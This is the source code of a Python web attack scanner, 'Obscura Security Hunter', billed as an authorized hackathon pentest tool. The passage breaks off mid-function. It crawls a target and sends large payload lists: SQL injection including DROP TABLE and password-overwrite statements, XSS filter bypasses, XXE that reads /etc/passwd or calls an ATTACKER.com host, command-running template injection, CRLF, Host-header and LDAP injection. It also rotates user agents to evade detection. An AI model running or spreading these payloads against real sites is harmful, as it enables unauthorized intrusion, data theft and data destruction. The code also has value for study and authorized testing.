#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Obscura Security Hunter - EXTREME DEEP SCANNER v3.0
Authorized penetration testing tool - MAXIMUM DEPTH

⚠️ WARNING: This scanner performs AGGRESSIVE testing
   - Use ONLY on systems you own or have written permission
   - Can take 10-30 minutes per target
   - Makes 1000+ requests
   - Tests EVERY known attack vector
   
✅ For Kartika Cyber Hackathon 2026 - Authorized Use Only
"""

import requests
import re
import json
import time
import urllib.parse
import base64
import hashlib
import itertools
import os
import socket
from urllib.parse import urlparse, urljoin, parse_qs, urlunparse
from bs4 import BeautifulSoup
from datetime import datetime
import warnings
import threading
import random
warnings.filterwarnings('ignore')

# ANSI color codes for professional output
class Colors:
    RED = '\033[91m'
    YELLOW = '\033[93m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    WHITE = '\033[97m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class ExtremeScanner:
    def __init__(self, target_url, scan_id=None, callback=None):
        self.target_url = target_url.rstrip('/')
        self.parsed = urlparse(self.target_url)
        self.base_domain = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.callback = callback
        self.findings = []
        self.session = requests.Session()
        self.session.verify = False
        
        # Scanner identification
        self.scan_id = scan_id or datetime.now().strftime("%Y%m%d_%H%M%S")
        self.start_time = datetime.now()
        
        # Logging setup
        log_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'logs')
        os.makedirs(log_dir, exist_ok=True)
        timestamp = self.start_time.strftime("%Y%m%d_%H%M%S")
        self.log_file = os.path.join(log_dir, f"scan_{self.scan_id}_{timestamp}.log")
        
        # Phase tracking (55 total phases)
        self.phase_total = 55
        self.current_phase = 0
        
        # Rotate user agents to avoid detection
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        
        # Crawling data
        self.discovered_urls = set()
        self.tested_urls = set()
        self.forms_found = []
        self.parameters_found = {}
        self.js_files = set()
        self.cookies = {}
        self.api_endpoints = set()
        
        # Advanced tracking
        self.response_times = []
        self.jwt_tokens = []
        self.session_tokens = []
        
        # Statistics
        self.requests_made = 0
        
    def write_log(self, message, color=Colors.WHITE):
        """Write to console and log file"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        console_msg = f"{color}[{timestamp}] {message}{Colors.RESET}"
        file_msg = f"[{timestamp}] {message}"
        
        print(console_msg)
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(file_msg + '\n')
        except:
            pass
    
    def log(self, phase, message):
        """Send progress update with phase numbering"""
        # Extract layer info for better display
        layer = "BASE"
        if "BRUTAL" in message.upper():
            layer = "BRUTAL"
        elif "ULTIMATE" in message.upper():
            layer = "ULTIMATE"
        elif "ARSENAL" in message.upper():
            layer = "ARSENAL"
        elif "ELITE" in message.upper():
            layer = "ELITE"
        
        display_msg = f"Phase {self.current_phase}/{self.phase_total}: {layer} - {message}"
        
        if self.callback:
            self.callback(phase, display_msg)
        
        self.write_log(display_msg, Colors.CYAN)
    
    def add_finding(self, title, severity, description, evidence, recommendation, cwe=None):
        """Add finding with full details and colored console output"""
        finding = {
            'title': title,
            'severity': severity,
            'description': description,
            'evidence': evidence,
            'recommendation': recommendation,
            'timestamp': datetime.now().isoformat(),
            'cwe': cwe
        }
        self.findings.append(finding)
        
        # Color-coded severity output
        color_map = {
            'Critical': Colors.RED + Colors.BOLD,
            'High': Colors.YELLOW,
            'Medium': Colors.GREEN,
            'Low': Colors.BLUE,
            'Info': Colors.WHITE
        }
        color = color_map.get(severity, Colors.WHITE)
        
        finding_msg = f"[{severity.upper()}] {title}"
        self.write_log(finding_msg, color)
        
        # Log evidence snippet
        evidence_snippet = evidence.split('\n')[0][:100]
        self.write_log(f"  Evidence: {evidence_snippet}...", Colors.WHITE)
    
    def make_request(self, url, method='GET', data=None, headers=None, timeout=15, allow_redirects=True):
        """Make HTTP request with FULL professional logging"""
        self.requests_made += 1
        
        # Rotate user agent
        if not headers:
            headers = {}
        headers['User-Agent'] = random.choice(self.user_agents)
        
        # Log REQUEST (like nuclei/sqlmap)
        log_msg = f"[REQ] {method} {url}"
        self.write_log(log_msg, Colors.BLUE)
        
        # Log headers if not default
        interesting_headers = {k: v for k, v in headers.items() if k != 'User-Agent'}
        if interesting_headers:
            self.write_log(f"  Headers: {interesting_headers}", Colors.BLUE)
        
        # Log POST data if present
        if data and method in ['POST', 'PUT']:
            data_snippet = str(data)[:200]
            self.write_log(f"  Payload: {data_snippet}", Colors.BLUE)
        
        start_time = time.time()
        try:
            if method == 'GET':
                resp = self.session.get(url, timeout=timeout, headers=headers, allow_redirects=allow_redirects)
            elif method == 'POST':
                resp = self.session.post(url, data=data, timeout=timeout, headers=headers, allow_redirects=allow_redirects)
            elif method == 'PUT':
                resp = self.session.put(url, data=data, timeout=timeout, headers=headers, allow_redirects=allow_redirects)
            elif method == 'DELETE':
                resp = self.session.delete(url, timeout=timeout, headers=headers, allow_redirects=allow_redirects)
            elif method == 'OPTIONS':
                resp = self.session.options(url, timeout=timeout, headers=headers)
            elif method == 'HEAD':
                resp = self.session.head(url, timeout=timeout, headers=headers)
            else:
                resp = self.session.request(method, url, timeout=timeout, headers=headers)
            
            # Track response time
            elapsed = time.time() - start_time
            self.response_times.append(elapsed)
            
            # Log RESPONSE
            resp_size = len(resp.content)
            resp_msg = f"[RESP] {resp.status_code} {resp.reason} ({resp_size} bytes, {elapsed:.3f}s)"
            self.write_log(resp_msg, Colors.GREEN if resp.status_code < 400 else Colors.YELLOW)
            
            # Extract tokens
            if 'Authorization' in resp.headers or 'authorization' in resp.headers:
                token = resp.headers.get('Authorization') or resp.headers.get('authorization')
                if 'Bearer' in token:
                    self.jwt_tokens.append(token)
            
            return resp
        except Exception as e:
            error_msg = f"[ERROR] Request failed: {str(e)}"
            self.write_log(error_msg, Colors.RED)
            return None
    
    def advanced_crawl(self, max_depth=3, max_pages=100):
        """EXTREME crawling - every possible page"""
        self.log("Phase 1", "Starting EXTREME crawl (this will take time)...")
        
        to_visit = [(self.target_url, 0)]
        visited = set()
        
        while to_visit and len(visited) < max_pages:
            url, depth = to_visit.pop(0)
            
            if url in visited or depth > max_depth:
                continue
            
            visited.add(url)
            self.discovered_urls.add(url)
            
            self.log("Phase 1", f"Crawling [{len(visited)}/{max_pages}]: {url[:80]}...")
            
            resp = self.make_request(url)
            if not resp or resp.status_code not in [200, 201, 202, 203]:
                continue
            
            try:
                soup = BeautifulSoup(resp.text, 'html.parser')
                
                # Extract EVERYTHING
                # 1. Links
                for tag in soup.find_all(['a', 'link', 'area']):
                    href = tag.get('href')
                    if href:
                        full_url = urljoin(url, href)
                        parsed = urlparse(full_url)
                        if parsed.netloc == self.parsed.netloc:
                            if full_url not in visited and len(to_visit) < max_pages:
                                to_visit.append((full_url, depth + 1))
                            
                            # Extract parameters
                            if parsed.query:
                                params = parse_qs(parsed.query)
                                for param in params.keys():
                                    if param not in self.parameters_found:
                                        self.parameters_found[param] = []
                                    if full_url not in self.parameters_found[param]:
                                        self.parameters_found[param].append(full_url)
                
                # 2. Forms (ALL)
                for form in soup.find_all('form'):
                    form_data = {
                        'action': urljoin(url, form.get('action', '')),
                        'method': form.get('method', 'GET').upper(),
                        'inputs': [],
                        'url': url
                    }
                    
                    for input_tag in form.find_all(['input', 'textarea', 'select']):
                        form_data['inputs'].append({
                            'name': input_tag.get('name', ''),
                            'type': input_tag.get('type', 'text'),
                            'value': input_tag.get('value', '')
                        })
                    
                    if form_data['inputs']:  # Only add if has inputs
                        self.forms_found.append(form_data)
                
                # 3. JavaScript files
                for script in soup.find_all('script', src=True):
                    js_url = urljoin(url, script['src'])
                    if self.parsed.netloc in js_url:
                        self.js_files.add(js_url)
                
                # 4. API endpoints from JS
                js_inline = soup.find_all('script', src=False)
                for script in js_inline:
                    if script.string:
                        # Extract API endpoints
                        api_patterns = [
                            r'["\']/(api|v\d+|rest|graphql)[^"\']*["\']',
                            r'fetch\(["\']([^"\']+)["\']',
                            r'axios\.[get|post]+\(["\']([^"\']+)["\']',
                            r'\.ajax\(["\']([^"\']+)["\']'
                        ]
                        for pattern in api_patterns:
                            matches = re.findall(pattern, script.string)
                            for match in matches:
                                if isinstance(match, tuple):
                                    match = match[0]
                                api_url = urljoin(url, match)
                                if self.parsed.netloc in api_url:
                                    self.api_endpoints.add(api_url)
                
                # 5. Comments (might contain info)
                comments = soup.find_all(string=lambda text: isinstance(text, str) and '<!--' in str(text))
                for comment in comments:
                    comment_text = str(comment).lower()
                    # Look for URLs in comments
                    urls_in_comment = re.findall(r'https?://[^\s<>"]+|/[a-zA-Z0-9/_-]+', str(comment))
                    for found_url in urls_in_comment:
                        full_url = urljoin(url, found_url)
                        if self.parsed.netloc in full_url and full_url not in visited:
                            to_visit.append((full_url, depth + 1))
                
            except Exception as e:
                pass
            
            time.sleep(0.3)  # Be respectful
        
        self.log("Phase 1", f"Crawl complete: {len(self.discovered_urls)} URLs, {len(self.forms_found)} forms, {len(self.parameters_found)} params, {len(self.api_endpoints)} API endpoints")
    
    def extreme_sqli_test(self):
        """EXTREME SQL Injection - ALL techniques"""
        self.log("Phase 2", "EXTREME SQL Injection testing (50+ payloads per param)...")
        
        # Comprehensive SQLi payloads (from real-world attacks)
        sqli_payloads = [
            # Basic injections
            "'", '"', "1'", "1\"",
            
            # Boolean-based
            "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR '1'='1' #",
            "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\" --",
            "' OR 'a'='a", "' OR 'a'='a' --",
            "admin' OR '1'='1", "admin' OR '1'='1' --",
            
            # Union-based
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL--", "' UNION ALL SELECT NULL,NULL--",
            "' UNION SELECT @@version--", "' UNION SELECT version()--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--",
            
            # Comment-based bypass
            "admin'--", "admin'#", "admin'/*",
            "' or 1=1--", "' or 1=1#", "' or 1=1/*",
            
            # Stacked queries
            "'; DROP TABLE users--", "'; DELETE FROM users--",
            "'; UPDATE users SET password='hacked'--",
            
            # Blind SQLi (error-based)
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--",
            
            # Time-based blind
            "' AND SLEEP(5)--", "' AND BENCHMARK(5000000,MD5('test'))--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            
            # Order by detection
            "' ORDER BY 1--", "' ORDER BY 2--", "' ORDER BY 3--",
            "' ORDER BY 4--", "' ORDER BY 5--", "' ORDER BY 10--",
            
            # WAF bypass techniques
            "' /*!OR*/ '1'='1", "' %23OR%23 '1'='1",
            "' UnIoN SeLeCt NULL--", "' uNiOn aLl sElEcT NULL--",
            "' /**/OR/**/  '1'='1",
            
            # Encoding bypass
            "%27%20OR%20%271%27%3D%271", # URL encoded
            "' OR 0x31=0x31--", # Hex
            
            # Double encoding
            "%2527%20OR%20%25271%2527%253D%25271",
            
            # MySQL specific
            "' AND extractvalue(1, concat(0x7e, version()))--",
            "' AND updatexml(1, concat(0x7e, version()), 1)--",
            
            # PostgreSQL specific  
            "' AND 1=cast(version() as int)--",
            
            # MSSQL specific
            "' AND 1=convert(int, @@version)--",
            
            # NoSQL injection
            "' || '1'=='1", "' && '1'=='1",
            "'; return true; //", "'; return 1==1; //"
        ]
        
        # SQL error patterns (comprehensive)
        sql_errors = [
            r'sql syntax', r'mysql_fetch', r'mysqli', r'mysql_num_rows',
            r'pg_query', r'pg_exec', r'postgresql',
            r'sqlite_', r'sqlite3', r'sqlite error',
            r'odbc_exec', r'microsoft ole db', r'sql server',
            r'ora-\d{5}', r'oracle error', r'oci_',
            r'db2_', r'sybase', r'ingres_',
            r'warning.*mysql', r'error.*mysql',
            r'unclosed quotation', r'quoted string not properly terminated',
            r'syntax error at or near', r'unterminated string',
            r'invalid input syntax', r'division by zero',
            r'you have an error in your sql syntax'
        ]
        
        tested_count = 0
        
        # Test ALL parameters with ALL payloads
        for param_name, urls in self.parameters_found.items():
            for url in urls[:5]:  # Test up to 5 URLs per param
                for payload in sqli_payloads:
                    tested_count += 1
                    
                    if tested_count % 50 == 0:
                        self.log("Phase 2", f"SQLi tests: {tested_count} combinations tested...")
                    
                    # Parse URL and inject
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    # Test with time tracking
                    start = time.time()
                    resp = self.make_request(test_url)
                    elapsed = time.time() - start
                    
                    if not resp:
                        continue
                    
                    # Check for SQL errors
                    content_lower = resp.text.lower()
                    for error_pattern in sql_errors:
                        if re.search(error_pattern, content_lower, re.IGNORECASE):
                            # Extract error snippet
                            error_match = re.search(f'({error_pattern}[^<\n]{{0,100}})', content_lower, re.IGNORECASE)
                            error_snippet = error_match.group(1) if error_match else error_pattern
                            
                            self.add_finding(
                                f"SQL Injection Vulnerability - Parameter: {param_name}",
                                "Critical",
                                f"Parameter '{param_name}' is vulnerable to SQL injection. Database error messages leaked, indicating direct SQL query manipulation.",
                                f"**URL:** {test_url}\n\n**Payload:** `{payload}`\n\n**Error Pattern:** `{error_pattern}`\n\n**Error Snippet:** `{error_snippet[:200]}`\n\n**Response Time:** {elapsed:.2f}s\n\n**Response Length:** {len(resp.text)} bytes",
                                "**CRITICAL:** Use parameterized queries (prepared statements) IMMEDIATELY. Never concatenate user input into SQL queries. Implement input validation and WAF rules.",
                                cwe="CWE-89: SQL Injection"
                            )
                            return  # Found confirmed SQLi, stop testing
                    
                    # Check for time-based blind SQLi
                    if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper() or 'BENCHMARK' in payload.upper():
                        if elapsed > 4:  # If response took > 4 seconds
                            self.add_finding(
                                f"Time-Based Blind SQL Injection - Parameter: {param_name}",
                                "Critical",
                                f"Parameter '{param_name}' vulnerable to time-based blind SQL injection. Server response delay confirms SQL execution.",
                                f"**URL:** {test_url}\n\n**Payload:** `{payload}`\n\n**Expected Delay:** 5 seconds\n\n**Actual Response Time:** {elapsed:.2f}s\n\n**Baseline Response Time:** {sum(self.response_times[-10:])/len(self.response_times[-10:]) if self.response_times else 0:.2f}s",
                                "Use prepared statements. Implement query timeout limits. Monitor for time-based attacks.",
                                cwe="CWE-89: SQL Injection (Time-Based Blind)"
                            )
                            return
                    
                    time.sleep(0.15)
        
        self.log("Phase 2", f"SQLi testing complete. Tested {tested_count} combinations")
    
    def extreme_xss_test(self):
        """EXTREME XSS testing - polyglot payloads"""
        self.log("Phase 3", "EXTREME XSS testing (advanced payloads + WAF bypass)...")
        
        # Advanced XSS payloads (from real attacks + OWASP)
        xss_payloads = [
            # Basic
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            
            # Polyglot payloads (work in multiple contexts)
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
            '\'-alert(1)-\'',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            
            # Event handlers
            '<body onload=alert(1)>',
            '<input autofocus onfocus=alert(1)>',
            '<select autofocus onfocus=alert(1)>',
            '<textarea autofocus onfocus=alert(1)>',
            '<keygen autofocus onfocus=alert(1)>',
            '<video><source onerror="alert(1)">',
            '<audio src=x onerror=alert(1)>',
            
            # DOM-based
            '<img src=x:alert(1) onerror=eval(src)>',
            '<img src onerror=eval(atob(\'YWxlcnQoMSk=\'))>',  # Base64: alert(1)
            
            # Context-specific
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '</script><script>alert(1)</script>',
            '<script>alert(1)//</script>',
            
            # WAF bypass techniques
            '<sCrIpT>alert(1)</ScRiPt>',
            '<script/src=data:,alert(1)>',
            '<script>al\u0065rt(1)</script>',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
            '<script><!--alert(1)--></script>',
            '<script>/**/alert(1)/**///</script>',
            
            # Encoding bypass
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            
            # CSS injection
            '<style>@import\'javascript:alert(1)\';</style>',
            '<link rel="stylesheet" href="javascript:alert(1)">',
            
            # Protocol handlers
            '<a href="javascript:alert(1)">click</a>',
            '<form action="javascript:alert(1)"><input type=submit>',
            
            # SVG-based
            '<svg><script>alert(1)</script></svg>',
            '<svg><script xlink:href="data:,alert(1)"/></svg>',
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            
            # MathML-based
            '<math><mtext><script>alert(1)</script></mtext></math>',
            
            # Template injection
            '{{7*7}}', '${7*7}', '<%= 7*7 %>',  # May reveal template engine
            
            # CRLF injection
            '%0d%0aContent-Length:35%0d%0a%0d%0a<script>alert(1)</script>',
            
            # Mutation XSS (mXSS)
            '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
            
            # Unicode bypass
            '<script>\\u0061lert(1)</script>',
            '<script>\\x61lert(1)</script>',
        ]
        
        tested_count = 0
        
        # Test GET parameters
        for param_name, urls in self.parameters_found.items():
            for url in urls[:3]:
                for payload in xss_payloads[:20]:  # Test top 20 payloads per param
                    tested_count += 1
                    
                    if tested_count % 30 == 0:
                        self.log("Phase 3", f"XSS tests: {tested_count} combinations...")
                    
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))
                    
                    resp = self.make_request(test_url)
                    if not resp:
                        continue
                    
                    # Check if payload reflected
                    if payload in resp.text:
                        # Verify it's not encoded/escaped
                        dangerous_chars = ['<script', 'onerror=', 'onload=', 'javascript:', '<svg', '<img']
                        if any(char.lower() in resp.text.lower() for char in dangerous_chars):
                            # Extract context
                            context_match = re.search(f'(.{{0,50}}{re.escape(payload)}.{{0,50}})', resp.text)
                            context = context_match.group(1) if context_match else payload
                            
                            self.add_finding(
                                f"Reflected Cross-Site Scripting (XSS) - Parameter: {param_name}",
                                "High",
                                f"Parameter '{param_name}' reflects user input without proper sanitization, enabling XSS attacks. Payload executed in browser context.",
                                f"**URL:** {test_url}\n\n**Payload:** `{payload}`\n\n**Reflected Context:** `{context[:200]}`\n\n**Dangerous Characters Found:** {[c for c in dangerous_chars if c.lower() in resp.text.lower()]}",
                                "**HIGH PRIORITY:** Implement output encoding (HTML entity encoding) for ALL user input. Use Content-Security-Policy header. Sanitize input on server-side.",
                                cwe="CWE-79: Cross-site Scripting (XSS)"
                            )
                            break
                    
                    time.sleep(0.15)
        
        # Test ALL forms
        for form in self.forms_found[:10]:
            for payload in xss_payloads[:10]:
                tested_count += 1
                
                form_data = {}
                for inp in form['inputs']:
                    if inp['name']:
                        form_data[inp['name']] = payload
                
                if form['method'] == 'POST':
                    resp = self.make_request(form['action'], method='POST', data=form_data)
                else:
                    resp = self.make_request(form['action'], method='GET', data=form_data)
                
                if resp and payload in resp.text:
                    if '<script' in resp.text.lower() or 'onerror=' in resp.text.lower():
                        self.add_finding(
                            f"Form-Based XSS - Form Action: {form['action']}",
                            "High",
                            "Form does not sanitize user input, enabling XSS attacks via form submission.",
                            f"**Form URL:** {form['url']}\n\n**Form Action:** {form['action']}\n\n**Method:** {form['method']}\n\n**Payload:** `{payload}`\n\n**Inputs Tested:** {len(form['inputs'])}",
                            "Sanitize ALL form inputs. Implement CSP. Use output encoding.",
                            cwe="CWE-79: XSS"
                        )
                        break
                
                time.sleep(0.15)
        
        self.log("Phase 3", f"XSS testing complete. Tested {tested_count} combinations")
    
    def test_xxe(self):
        """Test for XXE (XML External Entity) injection"""
        self.log("Phase 4", "Testing XXE (XML External Entity)...")
        
        # XXE payloads
        xxe_payloads = [
            # Basic XXE
            '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>''',
            
            # XXE with parameter entity
            '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<foo>test</foo>''',
            
            # Blind XXE
            '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER.com/xxe">]>
<foo>&xxe;</foo>''',
        ]
        
        # Test POST endpoints that might accept XML
        for url in list(self.discovered_urls)[:10]:
            for payload in xxe_payloads:
                resp = self.make_request(
                    url, 
                    method='POST', 
                    data=payload,
                    headers={'Content-Type': 'application/xml'}
                )
                
                if resp:
                    # Check for file disclosure
                    if 'root:x:' in resp.text or 'daemon:' in resp.text:
                        self.add_finding(
                            "XML External Entity (XXE) Injection",
                            "Critical",
                            "Application parses XML without disabling external entities, allowing file disclosure.",
                            f"**URL:** {url}\n\n**Payload:** ```xml\n{payload}\n```\n\n**Evidence:** File content found in response",
                            "Disable XML external entity processing. Use safe XML parsers.",
                            cwe="CWE-611: XXE"
                        )
                        return
                
                time.sleep(0.2)
        
        self.log("Phase 4", "XXE testing complete")
    
    def test_deserialization(self):
        """Test for insecure deserialization"""
        self.log("Phase 5", "Testing Insecure Deserialization...")
        
        # Look for serialized data in cookies/headers
        for cookie_name, cookie_value in self.session.cookies.items():
            # Check if it's base64 encoded serialized data
            try:
                decoded = base64.b64decode(cookie_value)
                # Python pickle magic bytes
                if b'\\x80' in decoded or b'pickle' in decoded.lower():
                    self.add_finding(
                        f"Potential Insecure Deserialization - Cookie: {cookie_name}",
                        "Critical",
                        "Cookie contains serialized Python objects, which may be exploitable.",
                        f"**Cookie:** {cookie_name}\n\n**Value (truncated):** {cookie_value[:100]}",
                        "Never deserialize untrusted data. Use JSON instead of pickle.",
                        cwe="CWE-502: Deserialization"
                    )
            except:
                pass
        
        self.log("Phase 5", "Deserialization testing complete")
    
    def test_jwt_vulnerabilities(self):
        """Test JWT tokens for vulnerabilities"""
        self.log("Phase 6", "Testing JWT vulnerabilities...")
        
        for token in self.jwt_tokens:
            try:
                # Parse JWT
                parts = token.split('.')
                if len(parts) != 3:
                    continue
                
                # Decode header
                header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
                payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
                
                # Check for weak algorithms
                alg = header.get('alg', 'none')
                if alg.lower() in ['none', 'hs256']:
                    self.add_finding(
                        f"Weak JWT Algorithm: {alg}",
                        "High",
                        f"JWT uses weak algorithm '{alg}' which may be exploitable.",
                        f"**Token:** {token[:50]}...\n\n**Algorithm:** {alg}\n\n**Payload:** {json.dumps(payload, indent=2)}",
                        "Use RS256 or stronger algorithms. Never use 'none'.",
                        cwe="CWE-327: Weak Crypto"
                    )
            except:
                pass
        
        self.log("Phase 6", "JWT testing complete")
    
    def test_race_conditions(self):
        """Test for race condition vulnerabilities"""
        self.log("Phase 7", "Testing Race Conditions...")
        
        # Test forms that might be vulnerable to race conditions
        for form in self.forms_found[:3]:
            # Send 10 concurrent requests
            threads = []
            responses = []
            
            def send_request():
                form_data = {}
                for inp in form['inputs']:
                    if inp['name']:
                        form_data[inp['name']] = inp.get('value', 'test')
                
                resp = self.make_request(
                    form['action'],
                    method=form['method'],
                    data=form_data
                )
                if resp:
                    responses.append(resp)
            
            # Launch concurrent requests
            for i in range(10):
                t = threading.Thread(target=send_request)
                threads.append(t)
                t.start()
            
            # Wait for all
            for t in threads:
                t.join()
            
            # Check if all succeeded (potential race condition)
            success_count = sum(1 for r in responses if r.status_code == 200)
            if success_count == 10:
                self.add_finding(
                    f"Potential Race Condition - Form: {form['action']}",
                    "Medium",
                    "Form accepts multiple concurrent submissions without proper locking.",
                    f"**Form:** {form['action']}\n\n**Method:** {form['method']}\n\n**Concurrent Successes:** {success_count}/10",
                    "Implement proper locking mechanisms. Use database transactions.",
                    cwe="CWE-362: Race Condition"
                )
                break
            
            time.sleep(1)
        
        self.log("Phase 7", "Race condition testing complete")
    
    def test_ssti(self):
        """Test for Server-Side Template Injection"""
        self.log("Phase 8", "Testing SSTI (Server-Side Template Injection)...")
        
        # SSTI payloads for different template engines
        ssti_payloads = [
            # Jinja2 (Python)
            '{{7*7}}', '{{7*\'7\'}}', '{{config}}', '{{self}}',
            '{{"".__class__.__mro__[1].__subclasses__()}}',
            
            # Twig (PHP)
            '{{7*7}}', '{{7*\'7\'}}', '{{_self}}',
            
            # Freemarker (Java)
            '${7*7}', '${7*\'7\'}', '<#assign ex="freemarker.template.utility.Execute"?new()>',
            
            # Velocity (Java)
            '#set($x=7*7)$x', '$class.inspect("java.lang.Runtime")',
            
            # ERB (Ruby)
            '<%= 7*7 %>', '<%= File.open(\'/etc/passwd\').read %>',
            
            # Smarty (PHP)
            '{7*7}', '{php}echo `id`;{/php}',
            
            # Thymeleaf (Java)
            '${7*7}', '*{7*7}',
        ]
        
        tested = 0
        for param_name, urls in self.parameters_found.items():
            for url in urls[:2]:
                for payload in ssti_payloads:
                    tested += 1
                    
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
                    
                    resp = self.make_request(test_url)
                    if not resp:
                        continue
                    
                    # Check if template executed (7*7=49, 7*'7'=7777777)
                    if '49' in resp.text or '7777777' in resp.text or 'freemarker' in resp.text.lower():
                        self.add_finding(
                            f"Server-Side Template Injection (SSTI) - Parameter: {param_name}",
                            "Critical",
                            "Template injection allows arbitrary code execution on server.",
                            f"**URL:** {test_url}\n\n**Payload:** `{payload}`\n\n**Evidence:** Mathematical expression evaluated in response",
                            "Never pass user input directly to template engines. Sandbox template execution.",
                            cwe="CWE-94: Code Injection"
                        )
                        return
                    
                    time.sleep(0.15)
        
        self.log("Phase 8", f"SSTI testing complete. Tested {tested} combinations")
    
    def test_crlf_injection(self):
        """Test for CRLF injection / HTTP Response Splitting"""
        self.log("Phase 9", "Testing CRLF Injection (HTTP Response Splitting)...")
        
        crlf_payloads = [
            '%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK',
            '%0d%0aSet-Cookie:%20admin=true',
            '%0d%0aLocation:%20http://evil.com',
            '\\r\\nSet-Cookie:%20injected=true',
            '%0aSet-Cookie:%20test=value',
        ]
        
        for param_name, urls in self.parameters_found.items():
            for url in urls[:1]:
                for payload in crlf_payloads:
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
                    
                    resp = self.make_request(test_url, allow_redirects=False)
                    if resp:
                        # Check if CRLF injected into headers
                        if 'Set-Cookie' in str(resp.headers) and 'injected' in str(resp.headers).lower():
                            self.add_finding(
                                f"CRLF Injection - Parameter: {param_name}",
                                "High",
                                "CRLF injection allows HTTP response splitting and header injection.",
                                f"**URL:** {test_url}\n\n**Payload:** `{payload}`\n\n**Injected Header Found**",
                                "Validate and sanitize all user input. Remove CRLF characters.",
                                cwe="CWE-93: CRLF Injection"
                            )
                            return
                    
                    time.sleep(0.2)
        
        self.log("Phase 9", "CRLF testing complete")
    
    def test_host_header_injection(self):
        """Test for Host Header Injection"""
        self.log("Phase 10", "Testing Host Header Injection...")
        
        malicious_hosts = [
            'evil.com',
            'evil.com:80',
            'localhost',
            '127.0.0.1',
        ]
        
        for host in malicious_hosts:
            resp = self.make_request(self.target_url, headers={'Host': host})
            if resp:
                # Check if malicious host reflected in response
                if host in resp.text:
                    self.add_finding(
                        "Host Header Injection",
                        "Medium",
                        "Application trusts Host header, enabling cache poisoning and password reset attacks.",
                        f"**Malicious Host:** {host}\n\n**Host reflected in response**",
                        "Validate Host header against whitelist. Use absolute URLs.",
                        cwe="CWE-74: Host Header Injection"
                    )
                    break
            
            time.sleep(0.2)
        
        self.log("Phase 10", "Host Header testing complete")
    
    def test_ldap_injection(self):
        """Test for LDAP Injection"""
        self.log("Phase 11", "Testing LDAP Injection...")
        
        ldap_payloads = [
            '*', '*)(&', '*)(|(objectClass=*',
            'admin*', 'admin)(&',
            '*)(uid=*)(|(uid=*',
        ]
        
        tested = 0
        for param_name, urls in self.parameters_found.items():
            if any(x in param_name.lower() for x in ['user', 'username', 'login', 'uid']):
                for url in urls[:1]:
                    for payload in ldap_payloads:
                        tested += 1
                        
                        parsed = urlparse(url)
                        params = parse_qs(parsed.query)
                        params[param_name] = [payload]
                        new_query = urllib.parse.urlencode(params, doseq=True)
                        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
                        
                        resp = self.make_request(test_url)
                        if resp:
                            # Check for LDAP errors
                            if any(err in resp.text.lower() for err in ['ldap', 'javax.naming', 'invalid dn syntax']):
                                self.add_finding(
                                    f"LDAP Injection - Parameter: {param_name}",
                                    "High",
                                    "LDAP injection allows authentication bypass and data exfiltration.",
                                    f"**URL:** {test_url}\n\n**Payload:** `{payload}`\n\n**LDAP error in response**",
